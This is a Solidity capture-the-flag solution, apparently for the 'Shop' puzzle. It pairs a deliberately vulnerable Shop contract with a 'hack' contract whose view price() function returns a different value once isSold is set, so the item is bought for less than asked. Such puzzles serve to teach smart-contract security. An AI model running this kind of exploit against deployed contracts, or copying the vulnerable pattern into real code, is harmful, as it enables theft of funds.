// SPDX-License-Identifier: MIT

//Сan you get the item from the shop for less than the price asked?
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
//View functions can not have a variable
//But we can manipulate it with variable on the Shop contract
contract hack {
    Shop public immutable target;

    constructor(address _target){
        target = Shop(_target);
    }

    function pwn() public {
        target.buy();
        require(target.price() == 99, "failed");
    }

    function price() external view returns(uint){
        if(target.isSold()){
            return 99;
        }
        return 100;
    }
}